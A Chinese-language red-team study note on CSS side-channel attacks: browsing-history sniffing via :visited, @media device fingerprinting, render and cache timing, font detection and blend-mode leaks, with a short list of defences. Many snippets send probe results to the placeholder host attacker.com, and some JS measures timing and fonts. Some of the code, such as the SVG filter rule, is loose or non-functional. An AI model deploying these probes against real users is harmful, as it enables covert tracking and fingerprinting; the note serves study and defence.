## 目录

- [[#一、CSS侧信道概念|一、CSS侧信道概念]]
- [[#二、浏览器历史嗅探|二、浏览器历史嗅探]]
- [[#三、视口大小指纹|三、视口大小指纹]]
- [[#四、渲染时间侧信道|四、渲染时间侧信道]]
- [[#五、字体与系统探测|五、字体与系统探测]]
- [[#六、CSS混合模式泄露|六、CSS混合模式泄露]]
- [[#七、CSS与性能侧信道|七、CSS与性能侧信道]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、CSS侧信道概念

CSS 侧信道是指：虽然CSS不能直接读取数据，但可以通过**间接手段**推断页面或用户的信息。这些技术利用CSS的渲染行为、时序差异、选择器匹配结果等侧面通道。

### 侧信道vs直接泄露

| | 直接泄露 | 侧信道 |
|---|---------|--------|
| 数据获取 | URL外泄（主动请求） | 观察到副作用 |
| 精度 | 精确字符 | 布尔值/范围 |
| 必要条件 | url()可用 | url()不需要 |
| 隐蔽性 | 低（有外网请求） | 极高 |

## 二、浏览器历史嗅探

### :visited 伪类探测

```css
a:visited {
 background-image: url('https://attacker.com/visited/example.com');
}
```

**历史：**
- < 2010年：CSS可直接基于`:visited`设置任何属性，可100%探测浏览历史
- 2010年后：浏览器限制`:visited`只能用color相关属性
- 现代浏览器：`:visited`仍可读取颜色，但通过`getComputedStyle()`获取的颜色会被统一返回

### 现代绕过方法

**1. 通过渲染时间差异**
```css
a:visited {
 /* 复杂的滤镜/转换——导致重绘时间差异 */
 filter: blur(0.1px);
}

/* JS侧——通过测量布局时间判断是否应用了filter */
```

**2. 通过像素颜色差异（Pixel Perfect Attack）**
利用`mix-blend-mode`产生微小的像素差异：
```css
a:visited {
 mix-blend-mode: difference;
}
/* 通过Canvas渲染 + 逐像素对比判断 */
```

**3. 通过iframe + CSS选择器**
```css
/* 在不同源的iframe中无法跨DOM，但可以在父页面匹配iframe的URL属性 */
a[href="https://secret.example.com"]:visited {
 /* 父页面中的 <a> 标签可以匹配特定URL */
}
```

## 三、视口大小指纹

### 通过@media查询

```css
@media (max-width: 1920px) and (min-width: 1680px) {
 /* 用户屏幕宽度 1680-1920 */
 body { background-image: url('https://attacker.com/res/1680-1920'); }
}

@media (max-width: 1680px) and (min-width: 1440px) {
 body { background-image: url('https://attacker.com/res/1440-1680'); }
}

@media (pointer: coarse) {
 /* 触屏设备 */
 body { background-image: url('https://attacker.com/device/touch'); }
}

@media (hover: none) {
 /* 无悬停能力（可能是移动端） */
 body { background-image: url('https://attacker.com/device/nohover'); }
}
```

### 指纹维度的信息

| @media特性 | 可推断信息 |
|-----------|-----------|
| `width/height` | 屏幕分辨率 |
| `resolution` | DPI缩放 |
| `pointer` | 触摸屏/鼠标 |
| `hover` | 悬停能力 |
| `color/color-gamut` | 显示器色域 |
| `prefers-color-scheme` | 明/暗模式 |
| `prefers-reduced-motion` | 无障碍设置 |
| `monochrome` | 是否为单色设备 |
| `dynamic-range` | HDR能力 |

### 窗口大小侧信道

攻击者可以通过iframe加载目标页面，并修改iframe的尺寸来探测页面在不同尺寸下的渲染差异：

```html
<iframe src="https://target.com" id="target" width="300"></iframe>
<!-- 通过修改width观察目标页面的@media响应 -->
```

## 四、渲染时间侧信道

### 原理

不同内容触发的CSS规则会导致不同的渲染时间。攻击者通过JS测量渲染时间，推断页面内容。

```javascript
// 测量复杂选择器匹配的渲染时间
const start = performance.now();
// 注入一个会大量重排的CSS规则
document.querySelector('#sensitive').style.animation = 'x .001s';
requestAnimationFrame(() => {
 const time = performance.now() - start;
 if (time > 5) {
 // 重排耗时较长 → 选择器匹配成功
 } else {
 // 重排耗时短 → 选择器未匹配
 }
});
```

### 复杂选择器的性能差异

```css
/* 大量元素匹配会触发更多渲染工作 */
input[type="password"]:not(:placeholder-shown) ~ * {
 /* 如果密码框含有内容，触发大量CSS重算 */
 transition: all .001s;
}
```

## 五、字体与系统探测

### 系统字体指纹

```css
/* 通过 font-family fallback 探测系统安装了哪些字体 */
span { font-family: "Calibri", "FallbackFont1", sans-serif; }
span[style*="Calibri"] {
 /* 如果匹配到Calibri（Windows系统），触发URL请求 */
 background-image: url('https://attacker.com/font/calibri');
}
```

### 通过 Canvas + CSS 字体测量

更精确的字体探测通过JS实现：

```javascript
// 测量某字体下特定字符串的渲染宽度
function fontExists(fontName) {
 const canvas = document.createElement('canvas');
 const ctx = canvas.getContext('2d');
 ctx.font = `72px "${fontName}", serif`;
 const width1 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
 ctx.font = '72px serif';
 const width2 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
 return width1 !== width2;
}
```

### 已知字体指纹价值

系统安装的字体组合可以推断：
- 操作系统版本（新版本Windows新字体）
- 安装的软件（Office = Calibri等字体）
- 用户的语言区域设置

## 六、CSS混合模式泄露

### mix-blend-mode原理

CSS混合模式（`mix-blend-mode`）决定了元素与背景的混合方式。不同的混合模式会产生不同的像素输出，通过对比可以推断重叠区域的原始颜色/内容。

```css
.overlay {
 mix-blend-mode: difference;
 background-color: #fff;
 position: absolute;
 top: 0;
 left: 0;
}
```

### 旁路CSRF Token泄露

假设CSRF Token作为文本渲染在页面上，但不在input中：

```css
/* 利用 -webkit-text-security 和自定义渲染 */
.csrf-token {
 -webkit-text-security: disc; /* 密码遮罩效果 */
 font-family: monospace;
}
/* 不同字符宽度不同，通过测量元素宽度可推断字符数 */
```

### SVG滤镜CSS泄露

```css
/* SVG feColorMatrix 滤镜 */
svg filter feColorMatrix {
 values: "1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0";
}
/* 不同的矩阵值产生不同色彩 → 截屏对比可推断原始颜色 */
```

## 七、CSS与性能侧信道

### CSS :has() 选择器性能差异

```css
/* 如果页面有某元素，:has()匹配成功 */
html:has(input[type="password"]) {
 --has-password: 1;
}

/* 通过JS的getComputedStyle性能差异推断 */
```

### @container 查询

```css
@container (min-width: 100px) {
 /* 容器查询满足条件时触发 */
 .target { background: url(https://attacker.com/container_match); }
}
```

### 资源加载时序攻击

```javascript
// 测量background-image加载时间
const img = new Image();
const start = performance.now();
img.src = 'https://target.com/sensitive-image.png';
img.onload = () => {
 const time = performance.now() - start;
 // 如果time极短 → 图片已缓存（用户之前访问过）
 // 如果time长 → 图片未缓存（首次加载）
};
```

## 八、红队视角总结

### CSS侧信道技术矩阵

| 技术 | 推断信息 | 精度 | 难度 |
|------|---------|------|------|
| :visited探测 | 浏览历史 | 布尔 | 中 |
| @media查询 | 屏幕/设备信息 | 范围 | 低 |
| 渲染时间差异 | 元素存在性 | 布尔 | 高 |
| 字体探测 | 系统字体列表 | 精确 | 低 |
| mix-blend-mode | 重叠区域颜色 | 范围 | 高 |
| 资源加载时序 | 缓存状态 | 布尔 | 中 |

### 实际攻击价值

1. **浏览器历史探测** → 推断用户身份/兴趣/使用习惯
2. **屏幕分辨率** → 唯一性指纹的一部分
3. **系统字体** → 操作系统版本，选择合适exploit
4. **缓存状态** → 判断用户是否访问过特定网站
5. **@media特性** → 辅助构建浏览器指纹

### 防御对策

- 浏览器厂商不断收紧CSS侧信道（`:visited`限制已证明）
- CSP可以限制外部样式加载
- SameSite Cookie、frame-ancestors 限制iframe嵌入
- 使用隐私浏览模式（消除历史记录痕迹）
- 禁用自定义CSS的用户输入（或严格净化）

---
**返回** [[CSS基础总目录|CSS基础总目录]] | [[../前端基础总目录|前端基础总目录]]
